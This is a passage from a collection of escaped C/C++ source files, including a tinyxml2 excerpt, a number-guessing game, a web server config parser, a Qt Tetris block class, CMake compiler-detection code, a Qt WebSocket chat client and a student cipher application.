);\r\n\t\tTIXMLASSERT( len >= 0 );\r\n\t\treturn len;\r\n\t}\r\n\t#define TIXML_SSCANF   sscanf\r\n#endif\r\n\r\n#if defined(_WIN64)\r\n\t#define TIXML_FSEEK _fseeki64\r\n\t#define TIXML_FTELL _ftelli64\r\n#elif defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__) || defined(__DragonFly__) || defined(__CYGWIN__)\r\n\t#define TIXML_FSEEK fseeko\r\n\t#define TIXML_FTELL ftello\r\n#elif defined(__ANDROID__) && __ANDROID_API__ > 24\r\n\t#define TIXML_FSEEK fseeko64\r\n\t#define TIXML_FTELL ftello64\r\n#else\r\n\t#define TIXML_FSEEK fseek\r\n\t#define TIXML_FTELL ftell\r\n#endif\r\n\r\n\r\nstatic const char LINE_FEED\t\t\t\t= static_cast<char>(0x0a);\t\t\t// all line endings are normalized to LF\r\nstatic const char LF = LINE_FEED;\r\nstatic const char CARRIAGE_RETURN\t\t= static_cast<char>(0x0d);\t\t\t// CR gets filtered out\r\nstatic const char CR = CARRIAGE_RETURN;\r\nstatic const char SINGLE_QUOTE\t\t\t= '\\'';\r\nstatic const char DOUBLE_QUOTE\t\t\t= '\\\"';\r\n\r\n// Bunch of unicode info at:\r\n//\t\thttp://www.unicode.org/faq/utf_bom.html\r\n//\tef bb bf (Microsoft \"lead bytes\") - designates UTF-8\r\n\r\nstatic const unsigned char TIXML_UTF_LEAD_0 = 0xefU;\r\nstatic const unsigned char TIXML_UTF_LEAD_1 = 0xbbU;\r\nstatic const unsigned char TIXML_UTF_LEAD_2 = 0xbfU;\r\n\r\nnamespace tinyxml2\r\n{\r\n\r\nstruct Entity {\r\n    const char* pattern;\r\n    int length;\r\n    char value;\r\n};\r\n\r\nstatic const int NUM_ENTITIES = 5;\r\nstatic const Entity entities[NUM_ENTITIES] = {\r\n    { \"quot\", 4,\tDOUBLE_QUOTE },\r\n    { \"amp\", 3,\t\t'&'  },\r\n    { \"apos\", 4,\tSINGLE_QUOTE },\r\n    { \"lt\",\t2, \t\t'<'\t },\r\n    { \"gt\",\t2,\t\t'>'\t }\r\n};\r\n\r\n\r\nStrPair::~StrPair()\r\n{\r\n    Reset();\r\n}\r\n\r\n\r\nvoid StrPair::TransferTo( StrPair* other )\r\n{\r\n    if ( this == other ) {\r\n        return;\r\n    }\r\n    // This in effect implements the assignment operator by \"moving\"\r\n    // ownership (as in auto_ptr).\r\n\r\n    TIXMLASSERT( other != 0 );\r\n    TIXMLASSERT( other->_flags == 0 );\r\n    TIXMLASS",
    "//number guesser\r\n\r\n//main idea: computer generates a number, you guess until you get the correct answer\r\n//using a random function(???)\r\n#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <chrono>\r\n#include <thread>\r\nusing namespace std;\r\n\r\nint main(){\r\nint retry;\r\nstring dyAccept;\r\n  do{\r\n      //create user choices\r\n    cout<<\"Welcome to this number guessing game!\\n\";\r\n    cout<<\"The computer will generate a random number from 1 to 10 each run you go!\\n\";\r\n    cout<<\"You will only get 3 tries, if you fail YOU DIE! MUEH HEHEHEHE!\\n\";\r\n    cout<<\"You have one chance left HUMAN, do you ACCEPT or do you PUSSY out?\\n\";\r\n    cout<<\"Answer only with 'I accept' or 'I do not accept'\\n\";\r\n    getline(cin, dyAccept);\r\n    \r\n    while(true){\r\n        if(dyAccept == \"I accept\"){\r\n            cout<<\"Well done, my son. You have chosen wisely!\\n\";\r\n            break;\r\n        }else if(dyAccept == \"I do not accept\"){\r\n            cout<<\"BEGONE! AND NEVER RETURN!\";\r\n            return 0;\r\n        }else{\r\n            if(retry == 1){\r\n                cout<<\"So you have restarted the game, eh?? Well pick a choose! And again choose wisely. Because a second chance will only happen if you win! MUE HEHEHE\\n\";\r\n                getline(cin, dyAccept);\r\n            }else{\r\n                cout<<\"Choose a proper choice you nimwit!\\n\";\r\n                getline(cin, dyAccept);\r\n            }\r\n        }\r\n    }\r\n    \r\n    //include attempts\r\n    int uAttempt = 0;\r\n    int aCount = 0;\r\n\r\n    cout<<\"You have three(3) attempts so be wise about your choice!\\n\\n\";\r\n\r\n    //create the randomness of the computer\r\n    int randomVal;\r\n    int randomT = time(0);\r\n    int userInput;\r\n\r\n    srand(randomT);\r\n    randomVal = (rand()%10)+1;\r\n    cout<<randomVal;\r\n\r\n    cout<<\"Enter your guess!\\n\";\r\n\r\n    while(aCount<3){\r\n        cin>>userInput;\r\n            if(userInput == randomVal){\r\n              cout<<\"You guessed right!\\n\";\r\n              break;\r\n            }else{\r\n              cout<<\"TF\\n\";\r\n              aCount++;\r\n              continue;\r\n            }\r\n    }\r\n  if(aCount == 3){\r\n      cout<<\"You have failed the guessing game, you shall not be given a chance no more!\";\r\n      cout<<\"\\nYou have been warned that you will die!\";\r\n      return 0;\r\n  }\r\n\r\n  cout<<\"Now that you have guessed the correct number\\n\";\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n  this_thread::sleep_for(chrono::seconds(1));\r\n  cout<<\"You shall receive.....\\n\";\r\n\r\n  cout<<\"\\nNOTHING LOL, thanks for trying this shit I have created :)\\n\";\r\n  cout<<\"How about going for another try?(press 1 to try, press 2 to exit): \";\r\n  cin>>retry;\r\n    if(retry == 2){\r\n      cout<<\"Once again, thank you!:))\";\r\n      return 0;\r\n    }\r\n\r\n  }while(retry == 1);\r\n}",
    "#include \"config.h\"\n\nConfig::Config(){\n    //\u7aef\u53e3\u53f7,\u9ed8\u8ba49006\n    PORT = 9006;\n\n    //\u65e5\u5fd7\u5199\u5165\u65b9\u5f0f\uff0c\u9ed8\u8ba4\u540c\u6b65\n    LOGWrite = 0;\n\n    //\u89e6\u53d1\u7ec4\u5408\u6a21\u5f0f,\u9ed8\u8ba4listenfd LT + connfd LT\n    TRIGMode = 0;\n\n    //listenfd\u89e6\u53d1\u6a21\u5f0f\uff0c\u9ed8\u8ba4LT\n    LISTENTrigmode = 0;\n\n    //connfd\u89e6\u53d1\u6a21\u5f0f\uff0c\u9ed8\u8ba4LT\n    CONNTrigmode = 0;\n\n    //\u4f18\u96c5\u5173\u95ed\u94fe\u63a5\uff0c\u9ed8\u8ba4\u4e0d\u4f7f\u7528\n    OPT_LINGER = 0;\n\n    //\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u6570\u91cf,\u9ed8\u8ba48\n    sql_num = 8;\n\n    //\u7ebf\u7a0b\u6c60\u5185\u7684\u7ebf\u7a0b\u6570\u91cf,\u9ed8\u8ba48\n    thread_num = 8;\n\n    //\u5173\u95ed\u65e5\u5fd7,\u9ed8\u8ba4\u4e0d\u5173\u95ed\n    close_log = 0;\n\n    //\u5e76\u53d1\u6a21\u578b,\u9ed8\u8ba4\u662fproactor\n    actor_model = 0;\n}\n\nvoid Config::parse_arg(int argc, char*argv[]){\n    int opt;\n    const char *str = \"p:l:m:o:s:t:c:a:\";\n    while ((opt = getopt(argc, argv, str)) != -1)\n    {\n        switch (opt)\n        {\n        case 'p':\n        {\n            PORT = atoi(optarg);\n            break;\n        }\n        case 'l':\n        {\n            LOGWrite = atoi(optarg);\n            break;\n        }\n        case 'm':\n        {\n            TRIGMode = atoi(optarg);\n            break;\n        }\n        case 'o':\n        {\n            OPT_LINGER = atoi(optarg);\n            break;\n        }\n        case 's':\n        {\n            sql_num = atoi(optarg);\n            break;\n        }\n        case 't':\n        {\n            thread_num = atoi(optarg);\n            break;\n        }\n        case 'c':\n        {\n            close_log = atoi(optarg);\n            break;\n        }\n        case 'a':\n        {\n            actor_model = atoi(optarg);\n            break;\n        }\n        default:\n            break;\n        }\n    }\n}",
    "#include \"block.h\"\n#include \"tetristable.h\"\n#include <QDebug>\n#define BIT_CLEAR (0b0000001111111111)\n\n// \u5b58\u50a8\u5f53\u524d\u6d3b\u52a8\u65b9\u5757\u7684\u503c\u548c\u9650\u5236\nactiveBlock::activeBlock() {\n  mp_blockValue = new quint16[TABLE_ROW]{0};\n  mp_limitValue = new quint16[TABLE_ROW]{0};\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    mp_blockValue[i] = 0x00;\n    mp_limitValue[i] = 0x00;\n  }\n}\n\nactiveBlock::~activeBlock() {\n  delete[] mp_blockValue;\n  mp_blockValue = nullptr;\n  delete[] mp_limitValue;\n  mp_limitValue = nullptr;\n}\n\nvoid activeBlock::init() {\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    mp_blockValue[i] = 0x0000;\n    mp_limitValue[i] = 0x0000;\n  }\n}\n\nvoid activeBlock::updateNewBlock(int state) {\n  m_pos.x = TABLE_COLUMN / 2 - 1;\n  m_pos.y = TABLE_ROW - 1;\n  m_pos.blockState = state;\n  updateBlockValue();\n}\n\nbool activeBlock::blockDown() {\n  if (checkPosition(m_pos.x, m_pos.y - 1, m_pos.blockState)) {\n    m_pos.y -= 1;\n    updateBlockValue();\n    return true;\n  } else {\n    return false;\n  }\n}\n\nvoid activeBlock::blockLeft() {\n  if (checkPosition(m_pos.x + 1, m_pos.y, m_pos.blockState)) {\n    m_pos.x += 1;\n    updateBlockValue();\n  }\n}\n\nvoid activeBlock::blockRight() {\n  if (checkPosition(m_pos.x - 1, m_pos.y, m_pos.blockState)) {\n    m_pos.x -= 1;\n    updateBlockValue();\n  }\n}\n\nvoid activeBlock::blockRevolve() {\n  int rem = (m_pos.blockState + 1) % 4;\n  int state = 0;\n  if (rem == 0)\n    state = -3;\n  else\n    state = 1;\n  qDebug() << QString(\"x=%1,y=%2,state=%3,in=%4\")\n                  .arg(m_pos.x)\n                  .arg(m_pos.y)\n                  .arg(m_pos.blockState)\n                  .arg(m_pos.blockState + state);\n  if (checkPosition(m_pos.x, m_pos.y, m_pos.blockState + state)) {\n    m_pos.blockState = m_pos.blockState + state;\n    updateBlockValue();\n  }\n}\n\nquint16 *activeBlock::blockValue() { return mp_blockValue; }\n\nvoid activeBlock::updateLimit(quint16 *limitTable) {\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    mp_limitValue[i] = limitTable[i];\n  }\n}\n\nvoid activeBlock::printValue() {\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    qDebug() << QString(\"%1\").arg(mp_blockValue[i], 10, 2);\n  }\n}\n\nvoid activeBlock::updateBlockValue() {\n  int xMove = m_pos.x - (TABLE_COLUMN / 2 - 1);\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    if (i <= m_pos.y + 2 && i >= m_pos.y - 2) {\n      int yMove = i - m_pos.y + 2;\n      if (xMove >= 0) {\n        mp_blockValue[i] = blockTable[m_pos.blockState][yMove] << (xMove);\n      } else {\n        mp_blockValue[i] = blockTable[m_pos.blockState][yMove] >> (-xMove);\n      }\n    } else {\n      mp_blockValue[i] = 0x0;\n    }\n  }\n}\n\nbool activeBlock::checkPosition(int x, int y, int state) {\n\n  int xMove = x - (TABLE_COLUMN / 2 - 1);\n  if (xMove >= 0) {\n    for (int i = 0; i < blockCheck; i++) {\n      quint16 oldv = blockTable[state][i] << xMove;\n      if (oldv >= (quint16)0x01 << TABLE_COLUMN)\n        return false;\n    }    // \u68c0\u6d4b\u5de6\u8fb9\u754c\n  } else // \u53f3\u79fb\n  {\n    for (int i = 0; i < blockCheck; i++) {\n      xMove = -xMove;\n      quint16 oldv = blockTable[state][i];\n      if ((oldv & (1 << (xMove - 1))) != 0)\n        return false;\n    } // \u68c0\u6d4b\u53f3\u8fb9\u754c\n  }\n\n  for (int i = 0; i < blockCheck; i++) {\n    quint16 oldv = blockTable[state][i];\n    // qDebug()<<i<<QString(\"0b%1\").arg(oldv, 16, 2, QLatin1Char('0'));\n    if (oldv > 0) {\n      if (y - (blockCheck / 2 - i) < 0)\n        return false;\n    } // \u68c0\u6d4b\u5e95\u8fb9\u754c\n  }\n  xMove = x - (TABLE_COLUMN / 2 - 1);\n  for (int i = 0; i < TABLE_ROW; i++) {\n    // qDebug()<<i<<m_pos.y;\n    if (mp_limitValue[i] != 0) {\n      for (int j = 0; j < blockCheck; j++) {\n        int ty = y + (j - blockCheck / 2);\n        if (ty == i) {\n          quint16 temp = blockTable[state][j];\n          if (xMove >= 0)\n            temp = (BIT_CLEAR) & (temp << (xMove));\n          else\n            temp = (BIT_CLEAR) & (temp >> (-xMove));\n          qDebug()\n              << QString(\"test 0b%1 0b%2 i=%3,j=%4,xMove=%5,x=%6,y=%7,state=%8\")\n                     .arg(temp, 16, 2, QLatin1Char('0'))\n                     .arg(mp_limitValue[i], 16, 2, QLatin1Char('0'))\n                     .arg(i)\n                     .arg(j)\n                     .arg(xMove)\n                     .arg(x)\n                     .arg(ty)\n                     .arg(state);\n          if ((temp & mp_limitValue[i]) != 0) {\n            qDebug()\n                << QString(\n                       \"test 0b%1 0b%2 i=%3,j=%4,xMove=%5,x=%6,y=%7,state=%8\")\n                       .arg(temp, 16, 2, QLatin1Char('0'))\n                       .arg(mp_limitValue[i], 16, 2, QLatin1Char('0'))\n                       .arg(i)\n                       .arg(j)\n                       .arg(xMove)\n                       .arg(x)\n                       .arg(ty)\n                       .arg(state);\n            return false;\n          }\n        }\n      }\n    }\n  }\n\n  return true;\n}\n\nstaticBlock::staticBlock() { mp_blockValue = new quint16[TABLE_ROW]{0}; }\n\nstaticBlock::~staticBlock() {\n  delete[] mp_blockValue;\n  mp_blockValue = nullptr;\n}\n\nvoid staticBlock::init() {\n  for (int i = 0; i < TABLE_ROW; ++i) ",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"client.h\"\r\n#include <QLocale>\r\nQTextStream cin(stdin);\r\n\r\nClient::Client(QObject *parent) //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00ee\u00e3\u00ee \u00f1\u00ee\u00ea\u00e5\u00f2\u00e0\r\n    :QObject{parent}\r\n{\r\n    cin.setEncoding(QStringConverter::Encoding::System);\r\n    socket=new QWebSocket;\r\n\r\n    //\u00f1\u00e2\u00ff\u00e7\u00fb\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00e8\u00e3\u00ed\u00e0\u00eb\u00ee\u00e2 \u00f1 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e8\u00ec\u00e8 \u00f1\u00eb\u00ee\u00f2\u00e0\u00ec\u00e8:\r\n    connect(socket,&QWebSocket::textMessageReceived,this,&Client::messageReceived);\r\n    connect(socket,&QWebSocket::binaryMessageReceived,this,&Client::serverMessageReceived);\r\n    connect(socket,&QWebSocket::disconnected,socket,&QWebSocket::deleteLater);\r\n    connect(this,&Client::needToSendMessage,socket,&QWebSocket::sendTextMessage);\r\n\r\n    //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00f7\u00f2\u00e5\u00ed\u00e8\u00e5 \u00e8\u00e7 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00e8 ip-\u00e0\u00e4\u00f0\u00e5\u00f1\u00e0 \u00e8 \u00ef\u00ee\u00f0\u00f2\u00e0 \u00e4\u00eb\u00ff \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00ff\r\n    QString addr,port;\r\n    qDebug() << \"Please, enter server address:\";\r\n    cin >> addr;\r\n    qDebug() << \"Please, enter port for connecting: \";\r\n    cin >> port;\r\n    connectToServer(qMakePair(addr,port));\r\n}\r\n\r\nvoid Client::connectToServer(const QPair<QString,QString> connectionData){ //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00f1\u00ee\u00e5\u00e4\u00e8\u00ed\u00e5\u00ed\u00e8\u00e5 \u00f1 \u00f1\u00e5\u00f0\u00e2\u00e5\u00f0\u00ee\u00ec, \u00f1 \u00f3\u00ea\u00e0\u00e7\u00e0\u00ed\u00e8\u00e5\u00ec \u00ef\u00f0\u00e8\u00f8\u00e5\u00e4\u00f8\u00e8\u00f5 \u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e4\u00eb\u00ff \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00ff\r\n    socket->open(QUrl(QString(\"ws://\")+connectionData.first+QString(\":\")+connectionData.second));\r\n}\r\n\r\nvoid Client::messageWaitingLoop()\r\n{\r\n    QString message;\r\n    while(true){\r\n        cin.readLineInto(&message);\r\n        if(!message.isEmpty()){\r\n            qDebug() << \"You:\" << message;\r\n            emit needToSendMessage(message);\r\n        }\r\n    }\r\n}\r\n\r\n\r\nClient::~Client() //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00ee\u00f7\u00e8\u00f1\u00f2\u00ea\u00e0 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8 \u00ed\u00e0 \u00ea\u00f3\u00f7\u00e5, \u00e2\u00fb\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e9 \u00ef\u00ee\u00e4 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00e8\u00e9 \u00f1\u00ee\u00ea\u00e5\u00f2 \u00e8 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ef\u00ee\u00f2\u00ee\u00ea\u00e0\r\n{\r\n    if(m_thread){\r\n        delete m_thread;\r\n    }\r\n    socket->deleteLater();\r\n}\r\n\r\nvoid Client::messageReceived(const QString &msg){ //\u00e2\u00fb\u00e2\u00ee\u00e4\u00e8\u00f2 \u00ed\u00e0 \u00fd\u00ea\u00f0\u00e0\u00ed \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00ff \u00ee\u00f2 \u00e4\u00f0\u00f3\u00e3\u00e8\u00f5 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00ee\u00e2\r\n   qDebug() << msg;\r\n}\r\n\r\n\r\nvoid Client::serverMessageReceived(const QByteArray &bytes){ //\u00ee\u00f2\u00e2\u00e5\u00f7\u00e0\u00e5\u00f2 \u00e7\u00e0 \u00ee\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00ea\u00f3 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00ff \u00ee\u00f2 \u00f1\u00e5\u00f0\u00e2\u00e5\u00f0\u00e0 \u00ee\u00e1 \u00f3\u00f1\u00ef\u00e5\u00f8\u00ed\u00ee\u00ec \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00e8 \u00e8 \u00e2\u00fb\u00e2\u00ee\u00e4\u00e8\u00f2 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00f3\u00fe \u00e8\u00ed\u00f4\u00ee\u00f0\u00ec\u00e0\u00f6\u00e8\u00fe \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc\r\n    QString str(bytes);\r\n    if(str==\"connected\"){\r\n        qDebug() << \"Successfully connected to server.\"\r\n                 << \"Now you can enter your message\";\r\n    }\r\n    m_thread = new std::thread(std::bind(&Client::messageWaitingLoop,this));\r\n}\r\n\r\n\r\n",
    "/*\nFCAI Cairo University Cipher and Decipher Application\nPurpose: Application that encrypts and decrypts messages using different cipher techniques\nUnder supervision by Dr.Mohamed El-Ramly\nAuthors:\n1. Youssef Amgad Abd Al Halim Ahmed solved simple substitution,route cipher,rail fence cipher,atbash cipher,menu\n\n2. Amr Khaled Ahmed Abd Al Hamid Mohamed solved XOR cipher,Vignere cipher,polybius cipher\n\n3. Mohamed Ahmed Mohamed Abd Al Wahab solved Affine cipher, Morse cipher,baconian cipher\n\n*/\n# include <iostream>\n# include <cctype>\n# include <string>\n#include<cctype>\n# include <cstring>\n# include <algorithm>\n# include <vector>\n#include <cmath>\n#include <sstream>\n#include <iomanip>\n#include <regex>\nusing namespace std;\nint simple_substitution(string msg);\nstring substitution_checker(string msg);\nint Rail_fence(string msg);\nbool is_correct_10(string cipher);\nbool is_correct_ab(string cipher);\nstring display(string msg);\nint baconian_main();\nstring menu_baconian();\nstring characters(const string &input);\nstring inp();\nstring inp_2();\nstring inp_3();\nstring ciphered_1(string decipher);\nstring ciphered_2(string decipher);\nstring deciphered_1(string cipher);\nstring deciphered_2(string cipher);\nint menu_cipher();\nint menu_decipher();\nstring menu();\nint Atbash(string msg);\nint polybius_menu();\nvoid cipher();\nvoid decipher();\nvoid frame_print();\nbool isExist_key(int temp);\nbool isDigits(string statement);\nint check_for_string();\nstring encryption(string temp);\nstring decryption(string before);\nstring ignore_statement(string before);\nstring ignore_statement_XOR(string before);\nbool availability (string temp);\nbool checker_string(string msg);\nbool is_alpha(string msg);\nint Route_Cipher(string msg);\nbool key_check(string key);\nstring ignore_statement_route(string before);\nvoid route_main();\nbool check_for_characters(const string& str);\nbool check_for_hexadecimal(const string& statement);\nvoid main_vigenere();\nvoid vigenere_decipher(const string& message, const string& keyword);\nvoid vigenere_cipher(const string& statement, const string& keyword);\nvoid XOR_cipher();\nvoid main_affine();\nstring valid_characters();\nstring affine_menu();\nstring affine_cipher(string s);\nstring affine_decipher(string s);\nbool validate_characters(string input);\nstring morse_input_cipher();\nstring morse_input_decipher();\nstring morse_cipher(string cipher);\nstring morse_decipher(string cipher);\nstring morse_menu();\nvoid morse_main();\nint key[5];\nvector<vector <string>> frame = {{\"A\",\"B\",\"C\",\"D\",\"E\"},{\"F\",\"G\",\"H\",\"IJ\",\"K\"},{\"L\",\"M\",\"N\",\"O\",\"P\"},{\"Q\",\"R\",\"S\",\"T\",\"U\"},{\"V\",\"W\",\"X\",\"Y\",\"Z\"}};\n\nint main() {\n    // welcomes user to program\n    cout << \"Welcome to our encryption and decryption application\" << endl;\n    string msg;\n\n\n    // displays cipher menu for user\n    string choice = menu();\n    // according to user choice go to chosen cipher\n    if (choice == \"K\") {\n        cout << \"Thank you for using our cipher application\" << endl;\n        exit(0);\n    } else if (choice == \"C\") {\n        polybius_menu();\n    } else if (choice == \"B\") {\n        baconian_main();\n    }\n    else if(choice==\"F\"){\n        route_main();\n    }\n    else if(choice==\"D\"){\n        cout<<\"Please enter your message: \"<<endl;\n        cin.ignore();\n        getline(cin,msg);\n        msg= substitution_checker(msg);\n        simple_substitution(msg);\n    }\n    else if(choice==\"G\"){\n        main_vigenere();\n    }\n    else if(choice==\"H\"){\n        XOR_cipher();\n    }\n    else if(choice==\"I\"){\n        main_affine();\n    }\n    else 